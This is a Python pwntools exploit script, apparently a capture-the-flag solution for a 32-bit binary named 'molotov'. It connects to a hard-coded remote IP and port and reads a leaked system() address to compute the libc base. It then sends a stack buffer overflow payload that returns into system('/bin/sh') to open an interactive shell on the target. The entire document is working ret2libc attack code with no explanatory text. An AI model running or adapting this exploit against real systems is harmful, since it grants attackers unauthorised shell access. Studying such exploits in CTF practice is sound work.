from pwn import *

elf = context.binary = ELF('./molotov')

# Trial and Error for the correct libc
libc = ELF('./libc6_2.30-0ubuntu2.1_i386.so')
host = '54.210.217.206'
port = 1240

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
        #return gdb.debug([elf.path] + argv, env={"LD_PRELOAD": libc.path}, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)
        #return process([ld.path, elf.path] + argv, env={"LD_PRELOAD": libc.path}, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b main
continue
'''.format(**locals())

io = start()
system = int(io.recvn(8), 16)
libc_base = system - libc.sym['system']
bin_sh = next(libc.search("/bin/sh")) + libc_base
log.info('Get system: {}'.format(hex(system)))
log.info('/bin/sh address: {}'.format(hex(bin_sh)))
io.recvuntil('Input : ')
io.sendline('A' * 32 + p32(system) + 'B' * 4 + p32(bin_sh))
io.interactive()
io.close()